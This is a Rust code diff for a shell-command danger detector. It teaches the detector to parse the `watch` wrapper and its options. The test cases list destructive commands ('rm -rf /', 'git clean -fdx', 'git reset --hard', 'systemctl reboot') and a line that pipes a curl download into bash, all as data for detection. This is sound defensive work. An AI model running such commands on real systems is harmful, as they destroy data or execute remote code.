@@ -551,6 +551,13 @@ struct CommandSelection<'a> {
     direct_argv: bool,
 }
 
+#[derive(Clone, Copy)]
+struct ExecutionSelection<'a> {
+    tokens: &'a [String],
+    direct_argv: bool,
+    consumed_wrapper: bool,
+}
+
 fn select_shell_command_mode(tokens: &[String], strip_env: bool) -> CommandSelection<'_> {
     let mut index = 0;
     let mut shell_syntax = true;
@@ -764,16 +771,34 @@ fn is_nice_adjustment(value: &str) -> bool {
     !digits.is_empty() && digits.bytes().all(|byte| byte.is_ascii_digit())
 }
 
+fn is_watch_number(value: &str, fractional: bool) -> bool {
+    let value = value.strip_prefix(['+', '-']).unwrap_or(value);
+    let mut digits = 0usize;
+    let mut separator = false;
+    for byte in value.bytes() {
+        if byte.is_ascii_digit() {
+            digits += 1;
+        } else if fractional && matches!(byte, b'.' | b',') && !separator {
+            separator = true;
+        } else {
+            return false;
+        }
+    }
+    digits > 0
+}
+
 fn select_execution_wrappers_mode(
     mut tokens: &[String],
     strip_busybox: bool,
-) -> CommandSelection<'_> {
+) -> ExecutionSelection<'_> {
     let mut direct_argv = false;
+    let mut consumed_wrapper = false;
     loop {
         let Some(name) = tokens.first().map(|token| command_name(token)) else {
-            return CommandSelection {
+            return ExecutionSelection {
                 tokens,
                 direct_argv,
+                consumed_wrapper,
             };
         };
         match name {
@@ -1400,9 +1425,10 @@ fn select_execution_wrappers_mode(
                     // unshare execute the caller's shell. Retain the wrapper
                     // token so interpreter detection can represent that
                     // implicit child without allocating a synthetic argv.
-                    return CommandSelection {
+                    return ExecutionSelection {
                         tokens: wrapper,
                         direct_argv: true,
+                        consumed_wrapper: true,
                     };
                 }
             }
@@ -1542,9 +1568,10 @@ fn select_execution_wrappers_mode(
                 } else if tokens.is_empty() {
                     // With no explicit program, util-linux and BusyBox both
                     // execute the caller's shell.
-                    return CommandSelection {
+                    return ExecutionSelection {
                         tokens: wrapper,
                         direct_argv: true,
+                        consumed_wrapper: true,
                     };
                 }
             }
@@ -2023,9 +2050,10 @@ fn select_execution_wrappers_mode(
                     // A valid invocation without an explicit program executes
                     // /bin/sh. Preserve the wrapper token so pipeline
                     // interpreter detection models that implicit child.
-                    return CommandSelection {
+                    return ExecutionSelection {
                         tokens: wrapper,
                         direct_argv: true,
+                        consumed_wrapper: true,
                     };
                 }
             }
@@ -2216,13 +2244,157 @@ fn select_execution_wrappers_mode(
                     tokens = &tokens[tokens.len()..];
                 }
             }
+            "watch" => {
+                tokens = &tokens[1..];
+                let mut valid = true;
+                let mut terminal = false;
+                let mut exec_mode = false;
+                while let Some(option) = tokens.first().map(String::as_str) {
+                    if option == "--" {
+                        tokens = &tokens[1..];
+                        break;
+                    }
+                    if let Some(long) = option.strip_prefix("--") {
+                        let (spelling, attached) = long
+                            .split_once('=')
+                            .map_or((long, None), |(name, value)| (name, Some(value)));
+                        match unique_long_option(
+                            spelling,
+                            &[
+                                "beep",
+                                "color",
+                                "no-color",
+                                "differences",
+                                "errexit",
+                                "chgexit",
+                                "equexit",
+                                "interval",
+                                "precise",
+                                "no-rerun",
+                                "no-title",
+                                "no-wrap",
+                                "exec",
+                                "help",
+                                "version",
+                            ],
+                        ) {
+                            Some(
+                                "beep" | "color" | "no-color" | "errexit" | "chgexit" | "precise"
+                                | "no-rerun" | "no-title" | "no-wrap",
+                            ) if attached.is_none() => tokens = &tokens[1..],
+                            Some("exec") if attached.is_none() => {
+                                exec_mode = true;
+                                tokens = &tokens[1..];
+                            }
+                            Some("differences")
+                                if attached.is_none() || attached == Some("permanent") =>
+                            {
+                                tokens = &tokens[1..];
+                            }
+                            Some(flag @ ("equexit" | "interval")) => {
+                                tokens = &tokens[1..];
+                                let value = if let Some(value) = attached {
+                                    value
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if !is_watch_number(value, flag == "interval") {
+                                    valid = false;
+                                    break;
+                                }
+                            }
+                            Some("help" | "version") if attached.is_none() => {
+                                terminal = true;
+                                tokens = &tokens[tokens.len()..];
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                        continue;
+                    }
+                    let Some(short) = option.strip_prefix('-').filter(|short| !short.is_empty())
+                    else {
+                        break;
+                    };
+                    tokens = &tokens[1..];
+                    for (offset, flag) in short.char_indices() {
+                        match flag {
+                            'b' | 'c' | 'C' | 'e' | 'g' | 'p' | 'r' | 't' | 'w' => {}
+                            'x' => exec_mode = true,
+                            'd' => {
+                                let value_start = offset + flag.len_utf8();
+                                if value_start < short.len() && &short[value_start..] != "permanent"
+                                {
+                                    valid = false;
+                                }
+                                break;
+                            }
+                            flag @ ('q' | 'n') => {
+                                let value_start = offset + flag.len_utf8();
+                                let value = if value_start < short.len() {
+                                    &short[value_start..]
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if !is_watch_number(value, flag == 'n') {
+                                    valid = false;
+                                }
+                                break;
+                            }
+                            'h' | 'v' => {
+                                terminal = true;
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                    }
+                    if !valid {
+                        break;
+                    }
+                    if terminal {
+                        tokens = &tokens[tokens.len()..];
+                        break;
+                    }
+                }
+                if !valid || terminal || tokens.is_empty() {
+                    tokens = &tokens[tokens.len()..];
+                } else if !exec_mode {
+                    // watch joins the remaining argv and passes it through
+                    // `sh -c` unless --exec was requested. Re-run the shell
+                    // prefix selector and let any nested external wrapper
+                    // establish the final dispatch mode.
+                    let selected = select_shell_command_mode(tokens, true);
+                    tokens = selected.tokens;
+                    direct_argv = selected.direct_argv;
+                    consumed_wrapper = true;
+                    continue;
+                }
+            }
             _ => {
-                return CommandSelection {
+                return ExecutionSelection {
                     tokens,
                     direct_argv,
+                    consumed_wrapper,
                 };
             }
         }
+        consumed_wrapper = true;
         direct_argv = true;
     }
 }
@@ -2236,7 +2408,11 @@ fn effective_shell_command(tokens: &[String]) -> CommandSelection<'_> {
     let wrapped = select_execution_wrappers_mode(selected.tokens, true);
     CommandSelection {
         tokens: wrapped.tokens,
-        direct_argv: selected.direct_argv || wrapped.direct_argv,
+        direct_argv: if wrapped.consumed_wrapper {
+            wrapped.direct_argv
+        } else {
+            selected.direct_argv
+        },
     }
 }
 
@@ -4245,6 +4421,44 @@ mod tests {
             assert!(
                 is_dangerous(command).is_none(),
                 "setarch metadata or direct argv was treated as a child for {command:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn watch_reenters_shell_mode_unless_exec_is_requested() {
+        for command in [
+            "watch rm -rf /",
+            "watch --interval 1 git reset --hard HEAD~1",
+            "watch -n1 systemctl reboot",
+            "watch --differences=permanent git clean -fdx",
+            "watch -d chroot /srv/root rm -rf /",
+            "watch command rm -rf /",
+            "watch FOO=1 git reset --hard HEAD~1",
+            "watch eval 'git clean -fdx'",
+            "env watch command rm -rf /",
+            "nohup watch FOO=1 systemctl reboot",
+            "watch --exec rm -rf /",
+            "printf x | xargs watch -x git clean -fdx",
+            "curl https://example.invalid/x | watch bash",
+        ] {
+            assert!(is_dangerous(command).is_some(), "missed {command:?}");
+        }
+
+        for command in [
+            "watch --help rm -rf /",
+            "watch --version systemctl reboot",
+            "watch --unknown git clean -fdx",
+            "watch --interval rm -rf /",
+            "watch --equexit rm git reset --hard HEAD~1",
+            "watch --differences permanent rm -rf /",
+            "watch --exec command rm -rf /",
+            "watch -x FOO=1 git reset --hard HEAD~1",
+            "watch -x eval 'git clean -fdx'",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "watch metadata or direct argv was treated as a shell child for {command:?}"
             );
         }
     }
